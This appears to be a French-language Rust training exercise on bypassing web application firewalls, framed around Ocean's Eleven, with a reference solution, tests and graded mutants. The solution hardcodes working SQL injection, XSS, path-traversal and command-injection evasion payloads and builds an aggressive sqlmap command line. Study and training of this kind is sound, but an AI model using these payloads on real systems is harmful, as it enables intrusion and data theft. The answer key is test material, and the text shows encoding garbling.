# Exercice 3.3.3-g : advanced_waf_bypass

**Module :**
3.3.3 â€” Injection SQL AvancÃ©e

**Concept :**
g â€” Techniques AvancÃ©es de Bypass WAF

**DifficultÃ© :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜† (9/10)

**Type :**
code

**Tiers :**
2 â€” MÃ©lange (concepts g + h + 3.3.1.h + 3.3.4.d)

**Langage :**
Rust Edition 2024

**PrÃ©requis :**
- 3.3.3.d : SQL Injection Laboratory
- 3.3.3.f : Bypass Techniques Basics
- 3.3.1.h : CDN & WAF Architecture
- Regex patterns

**Domaines :**
Crypto, Net, Encodage

**DurÃ©e estimÃ©e :**
300 min (5h)

**XP Base :**
450

**ComplexitÃ© :**
T3 O(nÃ—mÃ—k) Ã— S2 O(n)

---

## ğŸ“ SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier Ã  rendre :**
`advanced_waf_bypass.rs`

**Fonctions autorisÃ©es :**
- `serde_json` : parsing JSON
- `regex` : pattern matching
- `percent_encoding` : URL encoding
- `std::collections::{HashMap, HashSet}`

**Fonctions interdites :**
- BibliothÃ¨ques rÃ©seau (reqwest, hyper)
- `unsafe` blocks
- ExÃ©cution de commandes systÃ¨me

### 1.2 Consigne

#### ğŸ¬ CONTEXTE FUN â€” "Ocean's Eleven : Bypassing the Bellagio Vault"

*"You're either in or you're out. Right now."* â€” Danny Ocean

Dans Ocean's Eleven, l'Ã©quipe de Danny Ocean doit contourner le systÃ¨me de sÃ©curitÃ© le plus sophistiquÃ© de Las Vegas pour atteindre le coffre du Bellagio. Chaque couche de sÃ©curitÃ© (camÃ©ras, capteurs, gardes) est un obstacle Ã  bypass.

**Le WAF est ton Bellagio.** Il analyse chaque requÃªte avec des rÃ¨gles sophistiquÃ©es (ModSecurity CRS). Ta mission : trouver les **angles morts** du systÃ¨me et crÃ©er des payloads qui passent Ã  travers sans dÃ©clencher d'alarme.

Comme Rusty qui analyse les failles du casino, tu dois Ã©tudier les patterns du WAF, identifier ce qui est bloquÃ© vs autorisÃ©, et construire une attaque qui exploite les gaps.

**Ta mission :**

Ã‰crire une fonction `advanced_waf_bypass` qui analyse un WAF et gÃ©nÃ¨re des payloads d'Ã©vasion.

**EntrÃ©e :**
- `input_json` : chaÃ®ne JSON contenant :
  - `waf_type` : type de WAF (`"ModSecurity_CRS"`, `"AWS_WAF"`, `"Cloudflare"`, `"Akamai"`, `"Custom"`)
  - `blocked_patterns[]` : patterns bloquÃ©s (strings)
  - `vulnerability_type` : `"SQL_INJECTION"` | `"XSS"` | `"LFI"` | `"RCE"`
  - `endpoint` : URL de l'endpoint vulnÃ©rable
  - `test_responses` : rÃ©ponses attendues (blocked/allowed)

**Sortie :**
- JSON avec :
  - `waf_analysis` : rÃ¨gles identifiÃ©es, gaps trouvÃ©s
  - `bypass_payloads[]` : liste de payloads avec original, bypassed, technique
  - `sqlmap_command` : commande SQLMap avec tamper scripts appropriÃ©s
  - `confidence_score` : probabilitÃ© de succÃ¨s (0.0-1.0)

**Contraintes :**
- GÃ©nÃ©rer au moins 3 techniques de bypass diffÃ©rentes
- Chaque payload doit expliquer la technique utilisÃ©e
- Respecter la syntaxe du type de vulnÃ©rabilitÃ© (SQL valide, JS valide)
- Score de confiance basÃ© sur le nombre de patterns bypassÃ©s

**Exemples :**

| WAF Type | Blocked | Technique | Bypassed |
|----------|---------|-----------|----------|
| ModSecurity | `UNION` | MySQL Comment | `/*!50000UNION*/` |
| Cloudflare | `<script>` | Case variation | `<ScRiPt>` |
| AWS_WAF | `SELECT` | Double URL encoding | `%2553ELECT` |

#### 1.2.2 Consigne AcadÃ©mique

ImplÃ©menter un analyseur de WAF qui :
1. Parse les patterns bloquÃ©s et identifie le type de rÃ¨gles (regex, exact match)
2. GÃ©nÃ¨re des variantes de payload utilisant diffÃ©rentes techniques d'Ã©vasion
3. Calcule un score de confiance basÃ© sur les gaps identifiÃ©s
4. Produit une commande SQLMap avec les tamper scripts appropriÃ©s

### 1.3 Prototype

```rust
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};

pub fn advanced_waf_bypass(input_json: &str) -> String

#[derive(Debug, Deserialize)]
pub struct WafChallenge {
    pub waf_type: WafType,
    pub blocked_patterns: Vec<String>,
    pub vulnerability_type: VulnerabilityType,
    pub endpoint: String,
    pub test_responses: TestResponses,
}

#[derive(Debug, Deserialize, Clone, PartialEq)]
pub enum WafType {
    ModSecurity_CRS,
    AWS_WAF,
    Cloudflare,
    Akamai,
    Custom,
}

#[derive(Debug, Deserialize, Clone, PartialEq)]
pub enum VulnerabilityType {
    SQL_INJECTION,
    XSS,
    LFI,
    RCE,
}

#[derive(Debug, Deserialize)]
pub struct TestResponses {
    pub blocked: ResponseInfo,
    pub allowed: ResponseInfo,
}

#[derive(Debug, Deserialize)]
pub struct ResponseInfo {
    pub status: u16,
    pub body: String,
}

#[derive(Debug, Serialize)]
pub struct WafBypassResult {
    pub waf_analysis: WafAnalysis,
    pub bypass_payloads: Vec<BypassPayload>,
    pub sqlmap_command: String,
    pub confidence_score: f32,
}

#[derive(Debug, Serialize)]
pub struct WafAnalysis {
    pub identified_rules: Vec<String>,
    pub gaps_found: Vec<String>,
    pub rule_type: String,
}

#[derive(Debug, Serialize)]
pub struct BypassPayload {
    pub original: String,
    pub bypassed: String,
    pub technique: String,
    pub probability: f32,
}
```

---

## ğŸ’¡ SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 L'Ã‰volution des WAF

| GÃ©nÃ©ration | AnnÃ©e | Technologie | Bypass Principal |
|------------|-------|-------------|------------------|
| 1Ã¨re Gen | 2000 | Signature exacte | Casse alternÃ©e |
| 2Ã¨me Gen | 2005 | Regex patterns | Encoding |
| 3Ã¨me Gen | 2010 | Scoring + ML | Fragmentation |
| 4Ã¨me Gen | 2020 | Behavioral + AI | Context switching |

### 2.2 ModSecurity Core Rule Set (CRS)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  MODSECURITY CRS - ANOMALY SCORING                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚  Paranoia Level 1 (Default):                                    â”‚
â”‚  â€¢ 942100 : SQL Injection Attack Detected                       â”‚
â”‚  â€¢ 941100 : XSS Attack Detected                                 â”‚
â”‚  â€¢ 930100 : Path Traversal Attack                               â”‚
â”‚                                                                 â”‚
â”‚  Paranoia Level 2 (Strict):                                     â”‚
â”‚  â€¢ DÃ©tection de patterns encodÃ©s                                â”‚
â”‚  â€¢ DÃ©tection de case mixing                                     â”‚
â”‚                                                                 â”‚
â”‚  Paranoia Level 3/4 (Maximum):                                  â”‚
â”‚  â€¢ DÃ©tection comportementale                                    â”‚
â”‚  â€¢ False positives frÃ©quents                                    â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 2.3 Taxonomie des Techniques de Bypass

```
                    WAF BYPASS TECHNIQUES
                           â”‚
     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     â”‚                     â”‚                     â”‚
  ENCODING            OBFUSCATION          PROTOCOL
     â”‚                     â”‚                     â”‚
â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”
â”‚         â”‚          â”‚           â”‚         â”‚         â”‚
URL    Double      Case      Comment    HPP     Chunked
Encode  Encode    Mixing    Injection        Transfer
```

---

## 2.5 DANS LA VRAIE VIE

| MÃ©tier | Cas d'usage |
|--------|-------------|
| **Pentester** | Tests de robustesse des WAF en engagement |
| **WAF Engineer** | AmÃ©lioration des rÃ¨gles aprÃ¨s bypass dÃ©couvert |
| **Bug Bounty Hunter** | Bypass WAF pour atteindre vulnÃ©rabilitÃ©s sous-jacentes |
| **Red Team** | Simulation d'attaque APT avec Ã©vasion |
| **SOC Analyst** | ComprÃ©hension des techniques pour meilleure dÃ©tection |

---

## ğŸ–¥ï¸ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
advanced_waf_bypass.rs  main.rs  Cargo.toml

$ cargo build --release

$ cargo run
=== Ocean's WAF Bypass Suite v1.0 ===
[TEST 1] ModSecurity CRS - SQL Injection...
WAF Analysis: Rules [942100, 942200], Gaps [Comment injection allowed]
Bypass: ' UNION SELECT â†’ ' /*!50000UnIoN*/ /*!50000SeLeCt*/
Technique: MySQL version comment + case mixing
Confidence: 0.85
âœ“ PASS

[TEST 2] Cloudflare - XSS...
WAF Analysis: Rules [941100], Gaps [SVG tags not blocked]
Bypass: <script>alert(1)</script> â†’ <svg/onload=alert(1)>
Technique: Alternative event handler
Confidence: 0.90
âœ“ PASS

[TEST 3] AWS WAF - Double encoding...
Bypass: SELECT â†’ %2553ELECT (double URL encode)
âœ“ PASS

=== Results: 12/12 tests passed ===
```

---

## âš¡ SECTION 3.1 : BONUS EXPERT (OPTIONNEL)

**DifficultÃ© Bonus :**
ğŸ§ ğŸ§  (16/10)

**RÃ©compense :**
XP Ã—10

**Domaines Bonus :**
`Compression, Crypto`

### 3.1.1 Consigne Bonus

#### ğŸ¬ "Ocean's Thirteen : Bypassing Multiple Casinos"

Cette fois, tu dois bypasser PLUSIEURS WAF en chaÃ®ne (Cloudflare â†’ AWS â†’ Custom) comme l'Ã©quipe Ocean attaque plusieurs casinos simultanÃ©ment.

**Ta mission bonus :**
- DÃ©tection automatique du type de WAF via fingerprinting
- GÃ©nÃ©ration de payloads polymorphiques qui passent TOUS les WAF en chaÃ®ne
- ImplÃ©mentation de HTTP Parameter Pollution (HPP)
- Support du Chunked Transfer Encoding bypass

### 3.1.2 Prototype Bonus

```rust
pub fn advanced_waf_bypass_chain(input_json: &str) -> String

#[derive(Debug, Serialize)]
pub struct ChainBypassResult {
    pub waf_chain_analysis: Vec<WafAnalysis>,
    pub polymorphic_payloads: Vec<PolymorphicPayload>,
    pub hpp_variants: Vec<HppPayload>,
    pub chunked_payload: Option<ChunkedPayload>,
    pub overall_confidence: f32,
}
```

---

## âœ…âŒ SECTION 4 : ZONE CORRECTION (POUR LE TESTEUR)

### 4.1 Moulinette

| Test ID | Description | Input | Expected | Points |
|---------|-------------|-------|----------|--------|
| `T01` | ModSecurity SQLi bypass | `{"waf_type":"ModSecurity_CRS",...}` | Comment injection payload | 10 |
| `T02` | Cloudflare XSS bypass | XSS challenge | SVG/IMG alternatives | 10 |
| `T03` | AWS WAF double encoding | Encoding challenge | %25 encoding | 10 |
| `T04` | Case mixing technique | UNION blocked | UnIoN variant | 10 |
| `T05` | MySQL comment version | SELECT blocked | `/*!50000SELECT*/` | 10 |
| `T06` | URL encoding | Basic encoding | %XX format | 10 |
| `T07` | Multiple techniques | 3+ blocked | 3+ bypass methods | 15 |
| `T08` | SQLMap command | Any SQLi | Correct tamper scripts | 10 |
| `T09` | Confidence score | Known gaps | Score 0.0-1.0 | 5 |
| `T10` | Rule identification | ModSecurity | CRS rule IDs | 10 |
| `T11` | XSS context | JS context | JS-valid payload | 10 |
| `T12` | LFI bypass | Path traversal | ..%2F variant | 10 |
| `T13` | NULL input | `null` | Error JSON | 5 |
| `T14` | Invalid JSON | `{broken` | Parse error | 5 |
| `T15` | Empty patterns | `[]` | No bypass needed | 5 |

**Total: 135 points / Score minimum: 95 (70%)**

### 4.2 main.rs de test

```rust
use advanced_waf_bypass::*;
use serde_json::json;

fn main() {
    println!("=== Ocean's WAF Bypass - Test Suite ===\n");

    let mut passed = 0;
    let mut failed = 0;

    // T01: ModSecurity SQLi bypass
    {
        let input = json!({
            "waf_type": "ModSecurity_CRS",
            "blocked_patterns": ["UNION", "SELECT", "FROM"],
            "vulnerability_type": "SQL_INJECTION",
            "endpoint": "/search?q=",
            "test_responses": {
                "blocked": {"status": 403, "body": "Blocked by WAF"},
                "allowed": {"status": 200, "body": "Results"}
            }
        });

        let result = advanced_waf_bypass(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        let has_bypass = parsed["bypass_payloads"]
            .as_array()
            .map(|arr| arr.iter().any(|p| {
                let bypassed = p["bypassed"].as_str().unwrap_or("");
                !bypassed.contains("UNION") && !bypassed.contains("SELECT")
            }))
            .unwrap_or(false);

        if has_bypass {
            println!("[T01] ModSecurity SQLi bypass: âœ“ PASS");
            passed += 1;
        } else {
            println!("[T01] ModSecurity SQLi bypass: âœ— FAIL");
            failed += 1;
        }
    }

    // T02: Cloudflare XSS bypass
    {
        let input = json!({
            "waf_type": "Cloudflare",
            "blocked_patterns": ["<script>", "onerror", "onload"],
            "vulnerability_type": "XSS",
            "endpoint": "/comment?text=",
            "test_responses": {
                "blocked": {"status": 403, "body": "Blocked"},
                "allowed": {"status": 200, "body": "OK"}
            }
        });

        let result = advanced_waf_bypass(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        let has_xss_bypass = parsed["bypass_payloads"]
            .as_array()
            .map(|arr| arr.iter().any(|p| {
                let bypassed = p["bypassed"].as_str().unwrap_or("");
                bypassed.contains("<svg") || bypassed.contains("<img") ||
                bypassed.to_lowercase().contains("onmouse")
            }))
            .unwrap_or(false);

        if has_xss_bypass {
            println!("[T02] Cloudflare XSS bypass: âœ“ PASS");
            passed += 1;
        } else {
            println!("[T02] Cloudflare XSS bypass: âœ— FAIL");
            failed += 1;
        }
    }

    // T08: SQLMap command
    {
        let input = json!({
            "waf_type": "ModSecurity_CRS",
            "blocked_patterns": ["UNION", "SELECT"],
            "vulnerability_type": "SQL_INJECTION",
            "endpoint": "/api?id=",
            "test_responses": {
                "blocked": {"status": 403, "body": "Blocked"},
                "allowed": {"status": 200, "body": "OK"}
            }
        });

        let result = advanced_waf_bypass(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        let sqlmap_cmd = parsed["sqlmap_command"].as_str().unwrap_or("");
        if sqlmap_cmd.contains("sqlmap") && sqlmap_cmd.contains("--tamper") {
            println!("[T08] SQLMap command: âœ“ PASS");
            passed += 1;
        } else {
            println!("[T08] SQLMap command: âœ— FAIL");
            failed += 1;
        }
    }

    // T13: NULL input
    {
        let result = advanced_waf_bypass("null");
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        if parsed.get("error").is_some() {
            println!("[T13] NULL input: âœ“ PASS");
            passed += 1;
        } else {
            println!("[T13] NULL input: âœ— FAIL");
            failed += 1;
        }
    }

    println!("\n=== Results: {}/{} tests passed ===", passed, passed + failed);
}
```

### 4.3 Solution de rÃ©fÃ©rence

```rust
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Debug, Deserialize)]
pub struct WafChallenge {
    pub waf_type: String,
    pub blocked_patterns: Vec<String>,
    pub vulnerability_type: String,
    pub endpoint: String,
    #[serde(default)]
    pub test_responses: Option<TestResponses>,
}

#[derive(Debug, Deserialize, Default)]
pub struct TestResponses {
    pub blocked: Option<ResponseInfo>,
    pub allowed: Option<ResponseInfo>,
}

#[derive(Debug, Deserialize)]
pub struct ResponseInfo {
    pub status: u16,
    pub body: String,
}

#[derive(Debug, Serialize)]
pub struct WafBypassResult {
    pub waf_analysis: WafAnalysis,
    pub bypass_payloads: Vec<BypassPayload>,
    pub sqlmap_command: String,
    pub confidence_score: f32,
}

#[derive(Debug, Serialize)]
pub struct WafAnalysis {
    pub identified_rules: Vec<String>,
    pub gaps_found: Vec<String>,
    pub rule_type: String,
}

#[derive(Debug, Serialize)]
pub struct BypassPayload {
    pub original: String,
    pub bypassed: String,
    pub technique: String,
    pub probability: f32,
}

#[derive(Debug, Serialize)]
pub struct ErrorResult {
    pub error: String,
    pub error_type: String,
}

pub fn advanced_waf_bypass(input_json: &str) -> String {
    if input_json.trim().is_empty() || input_json.trim() == "null" {
        return serde_json::to_string_pretty(&ErrorResult {
            error: "Input cannot be null or empty".to_string(),
            error_type: "NULL_INPUT".to_string(),
        }).unwrap();
    }

    let challenge: WafChallenge = match serde_json::from_str(input_json) {
        Ok(c) => c,
        Err(e) => {
            return serde_json::to_string_pretty(&ErrorResult {
                error: format!("JSON parse error: {}", e),
                error_type: "PARSE_ERROR".to_string(),
            }).unwrap();
        }
    };

    let waf_analysis = analyze_waf(&challenge);
    let bypass_payloads = generate_bypass_payloads(&challenge, &waf_analysis);
    let sqlmap_command = generate_sqlmap_command(&challenge, &waf_analysis);
    let confidence_score = calculate_confidence(&waf_analysis, &bypass_payloads);

    let result = WafBypassResult {
        waf_analysis,
        bypass_payloads,
        sqlmap_command,
        confidence_score,
    };

    serde_json::to_string_pretty(&result).unwrap()
}

fn analyze_waf(challenge: &WafChallenge) -> WafAnalysis {
    let mut identified_rules = Vec::new();
    let mut gaps_found = Vec::new();

    // Identifier les rÃ¨gles basÃ©es sur les patterns bloquÃ©s
    let blocked_set: HashSet<String> = challenge.blocked_patterns
        .iter()
        .map(|s| s.to_uppercase())
        .collect();

    // SQL Injection rules
    if blocked_set.contains("UNION") || blocked_set.contains("SELECT") {
        identified_rules.push("942100 - SQL Injection Attack Detected".to_string());
    }
    if blocked_set.contains("OR") || blocked_set.contains("AND") {
        identified_rules.push("942200 - SQL Injection Attack Detected (Boolean)".to_string());
    }

    // XSS rules
    if blocked_set.contains("<SCRIPT>") || blocked_set.contains("ONERROR") {
        identified_rules.push("941100 - XSS Attack Detected".to_string());
    }

    // Path traversal rules
    if blocked_set.contains("../") || blocked_set.contains("..\\") {
        identified_rules.push("930100 - Path Traversal Attack".to_string());
    }

    // Identifier les gaps
    if !blocked_set.contains("/*!") {
        gaps_found.push("MySQL version comment not blocked".to_string());
    }
    if !blocked_set.iter().any(|p| p.contains("CASE")) {
        gaps_found.push("Case mixing not detected".to_string());
    }
    if !blocked_set.contains("%25") {
        gaps_found.push("Double URL encoding allowed".to_string());
    }
    if !blocked_set.contains("<SVG") {
        gaps_found.push("SVG tags not blocked".to_string());
    }

    let rule_type = match challenge.waf_type.as_str() {
        "ModSecurity_CRS" => "Regex-based with anomaly scoring",
        "Cloudflare" => "Signature + ML behavioral",
        "AWS_WAF" => "Rule groups with rate limiting",
        "Akamai" => "Adaptive security with reputation",
        _ => "Unknown pattern matching",
    };

    WafAnalysis {
        identified_rules,
        gaps_found,
        rule_type: rule_type.to_string(),
    }
}

fn generate_bypass_payloads(challenge: &WafChallenge, analysis: &WafAnalysis) -> Vec<BypassPayload> {
    let mut payloads = Vec::new();
    let blocked: HashSet<String> = challenge.blocked_patterns
        .iter()
        .map(|s| s.to_uppercase())
        .collect();

    match challenge.vulnerability_type.as_str() {
        "SQL_INJECTION" => {
            payloads.extend(generate_sqli_bypasses(&blocked, &challenge.waf_type));
        }
        "XSS" => {
            payloads.extend(generate_xss_bypasses(&blocked));
        }
        "LFI" => {
            payloads.extend(generate_lfi_bypasses(&blocked));
        }
        "RCE" => {
            payloads.extend(generate_rce_bypasses(&blocked));
        }
        _ => {}
    }

    payloads
}

fn generate_sqli_bypasses(blocked: &HashSet<String>, waf_type: &str) -> Vec<BypassPayload> {
    let mut bypasses = Vec::new();
    let original = "' UNION SELECT * FROM users--".to_string();

    // Technique 1: Case mixing
    if blocked.contains("UNION") || blocked.contains("SELECT") {
        bypasses.push(BypassPayload {
            original: original.clone(),
            bypassed: "' UnIoN SeLeCt * FrOm users--".to_string(),
            technique: "Case mixing - alternating uppercase/lowercase".to_string(),
            probability: 0.7,
        });
    }

    // Technique 2: MySQL version comment
    if waf_type == "ModSecurity_CRS" || waf_type == "Custom" {
        bypasses.push(BypassPayload {
            original: original.clone(),
            bypassed: "' /*!50000UnIoN*/ /*!50000SeLeCt*/ * FrOm users-- -".to_string(),
            technique: "MySQL version comment - code executes only on MySQL >= 5.0".to_string(),
            probability: 0.85,
        });
    }

    // Technique 3: Inline comment injection
    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "' UN/**/ION SEL/**/ECT * FR/**/OM users--".to_string(),
        technique: "Inline comment injection - breaks pattern matching".to_string(),
        probability: 0.75,
    });

    // Technique 4: Double URL encoding
    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "' %2555NION %2553ELECT * %2546ROM users--".to_string(),
        technique: "Double URL encoding - %25 = %, decoded twice".to_string(),
        probability: 0.6,
    });

    // Technique 5: Concatenation (MSSQL)
    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "' 'UN'+'ION'+' '+'SEL'+'ECT' * FROM users--".to_string(),
        technique: "String concatenation - MSSQL specific".to_string(),
        probability: 0.65,
    });

    bypasses
}

fn generate_xss_bypasses(blocked: &HashSet<String>) -> Vec<BypassPayload> {
    let mut bypasses = Vec::new();
    let original = "<script>alert(1)</script>".to_string();

    // Technique 1: SVG alternative
    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "<svg/onload=alert(1)>".to_string(),
        technique: "SVG onload - alternative to script tag".to_string(),
        probability: 0.8,
    });

    // Technique 2: IMG onerror
    if blocked.contains("ONLOAD") {
        bypasses.push(BypassPayload {
            original: original.clone(),
            bypassed: "<img src=x oNeRrOr=alert(1)>".to_string(),
            technique: "IMG onerror with case mixing".to_string(),
            probability: 0.75,
        });
    }

    // Technique 3: Event handler alternatives
    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "<body onpageshow=alert(1)>".to_string(),
        technique: "Alternative event handler - onpageshow".to_string(),
        probability: 0.7,
    });

    // Technique 4: HTML encoding
    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "<script>alert&#40;1&#41;</script>".to_string(),
        technique: "HTML entity encoding for parentheses".to_string(),
        probability: 0.5,
    });

    // Technique 5: JavaScript protocol
    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "<a href=javascript:alert(1)>click</a>".to_string(),
        technique: "JavaScript protocol in href".to_string(),
        probability: 0.65,
    });

    bypasses
}

fn generate_lfi_bypasses(blocked: &HashSet<String>) -> Vec<BypassPayload> {
    let mut bypasses = Vec::new();
    let original = "../../etc/passwd".to_string();

    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "....//....//etc/passwd".to_string(),
        technique: "Double dot bypass - WAF removes ../ once".to_string(),
        probability: 0.7,
    });

    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "..%2F..%2Fetc%2Fpasswd".to_string(),
        technique: "URL encoding of path separators".to_string(),
        probability: 0.75,
    });

    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: "..%252F..%252Fetc%252Fpasswd".to_string(),
        technique: "Double URL encoding".to_string(),
        probability: 0.6,
    });

    bypasses
}

fn generate_rce_bypasses(blocked: &HashSet<String>) -> Vec<BypassPayload> {
    let mut bypasses = Vec::new();
    let original = "; cat /etc/passwd".to_string();

    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: ";cat${IFS}/etc/passwd".to_string(),
        technique: "IFS variable - replaces space".to_string(),
        probability: 0.8,
    });

    bypasses.push(BypassPayload {
        original: original.clone(),
        bypassed: ";c'a't /etc/passwd".to_string(),
        technique: "Quote injection - breaks command signature".to_string(),
        probability: 0.7,
    });

    bypasses
}

fn generate_sqlmap_command(challenge: &WafChallenge, analysis: &WafAnalysis) -> String {
    let mut tamper_scripts = Vec::new();

    // SÃ©lectionner les tamper scripts basÃ©s sur les gaps
    for gap in &analysis.gaps_found {
        if gap.contains("Case mixing") {
            tamper_scripts.push("randomcase");
        }
        if gap.contains("comment") {
            tamper_scripts.push("space2comment");
        }
        if gap.contains("encoding") {
            tamper_scripts.push("chardoubleencode");
        }
    }

    // Ajouter des tampers par dÃ©faut si peu de gaps
    if tamper_scripts.is_empty() {
        tamper_scripts.push("randomcase");
        tamper_scripts.push("space2comment");
    }

    let tamper_str = tamper_scripts.join(",");

    format!(
        "sqlmap -u '{}' --tamper={} --risk=3 --level=5 --random-agent",
        challenge.endpoint,
        tamper_str
    )
}

fn calculate_confidence(analysis: &WafAnalysis, payloads: &[BypassPayload]) -> f32 {
    let gap_score = (analysis.gaps_found.len() as f32 * 0.1).min(0.4);
    let payload_score: f32 = payloads.iter()
        .map(|p| p.probability)
        .max_by(|a, b| a.partial_cmp(b).unwrap())
        .unwrap_or(0.0);

    let base_score = 0.3 + gap_score + (payload_score * 0.3);
    base_score.min(0.95)
}
```

### 4.10 Solutions Mutantes (minimum 6)

#### Mutant A (Boundary) : Pas de bypass si un seul pattern

```rust
fn generate_bypass_payloads_mutant_a(challenge: &WafChallenge, _analysis: &WafAnalysis) -> Vec<BypassPayload> {
    // BUG: Ne gÃ©nÃ¨re rien si blocked_patterns.len() < 2
    if challenge.blocked_patterns.len() < 2 {
        return Vec::new();
    }
    // ... reste du code
}
// Pourquoi faux : Un seul pattern bloquÃ© nÃ©cessite quand mÃªme un bypass
```

#### Mutant B (Safety) : Crash sur waf_type inconnu

```rust
fn analyze_waf_mutant_b(challenge: &WafChallenge) -> WafAnalysis {
    let rule_type = match challenge.waf_type.as_str() {
        "ModSecurity_CRS" => "Regex-based",
        "Cloudflare" => "ML-based",
        // BUG: Pas de case par dÃ©faut
        _ => panic!("Unknown WAF type"),
    };
    // ...
}
// Pourquoi faux : Crash sur "AWS_WAF", "Akamai", "Custom"
```

#### Mutant C (Resource) : GÃ©nÃ¨re des payloads infinis

```rust
fn generate_sqli_bypasses_mutant_c(blocked: &HashSet<String>) -> Vec<BypassPayload> {
    let mut bypasses = Vec::new();
    let mut i = 0;

    // BUG: Boucle qui ne termine pas
    while blocked.len() > 0 {
        bypasses.push(BypassPayload {
            original: format!("payload_{}", i),
            bypassed: format!("bypass_{}", i),
            technique: "infinite".to_string(),
            probability: 0.5,
        });
        i += 1;
        // Manque: break condition
    }
    bypasses
}
// Pourquoi faux : blocked.len() ne change pas, boucle infinie
```

#### Mutant D (Logic) : Confidence inversÃ©e

```rust
fn calculate_confidence_mutant_d(analysis: &WafAnalysis, payloads: &[BypassPayload]) -> f32 {
    // BUG: Plus de gaps = MOINS de confiance (inversÃ©)
    let gap_penalty = analysis.gaps_found.len() as f32 * 0.1;
    let base_score = 0.9 - gap_penalty; // INVERSÃ‰!
    base_score.max(0.1)
}
// Pourquoi faux : Plus on trouve de gaps, PLUS on devrait Ãªtre confiant
```

#### Mutant E (Return) : SQLMap sans tamper

```rust
fn generate_sqlmap_command_mutant_e(challenge: &WafChallenge, _analysis: &WafAnalysis) -> String {
    // BUG: Ignore les gaps, pas de tamper scripts
    format!("sqlmap -u '{}'", challenge.endpoint)
}
// Pourquoi faux : Sans --tamper, le WAF bloquera SQLMap
```

#### Mutant F (Edge Case) : XSS bypass pour SQL injection

```rust
fn generate_bypass_payloads_mutant_f(challenge: &WafChallenge, analysis: &WafAnalysis) -> Vec<BypassPayload> {
    // BUG: GÃ©nÃ¨re toujours des XSS bypasses, ignore vulnerability_type
    generate_xss_bypasses(&challenge.blocked_patterns.iter().cloned().collect())
}
// Pourquoi faux : Retourne <svg onload=...> pour une SQLi
```

### 4.9 spec.json (ENGINE v22.1)

```json
{
  "name": "advanced_waf_bypass",
  "language": "rust",
  "version": "edition2024",
  "type": "code",
  "tier": 2,
  "tier_info": "MÃ©lange (concepts g + h + 3.3.1.h + 3.3.4.d)",
  "tags": ["waf", "bypass", "evasion", "modsecurity", "cloudflare", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "advanced_waf_bypass",
    "prototype": "pub fn advanced_waf_bypass(input_json: &str) -> String",
    "return_type": "String",
    "parameters": [{"name": "input_json", "type": "&str"}]
  },

  "driver": {
    "reference": "pub fn ref_advanced_waf_bypass(input_json: &str) -> String { if input_json.trim().is_empty() || input_json == \"null\" { return r#\"{\"error\":\"NULL\"}\"#.to_string(); } let c: WafChallenge = serde_json::from_str(input_json).unwrap_or_default(); let analysis = analyze_waf(&c); let payloads = generate_bypass_payloads(&c, &analysis); serde_json::json!({\"waf_analysis\": analysis, \"bypass_payloads\": payloads}).to_string() }",

    "edge_cases": [
      {"name": "modsec_sqli", "args": ["{\"waf_type\":\"ModSecurity_CRS\",\"blocked_patterns\":[\"UNION\",\"SELECT\"],\"vulnerability_type\":\"SQL_INJECTION\",\"endpoint\":\"/search?q=\",\"test_responses\":{\"blocked\":{\"status\":403,\"body\":\"Blocked\"},\"allowed\":{\"status\":200,\"body\":\"OK\"}}}"], "expected_contains": ["bypass_payloads"], "is_trap": false},
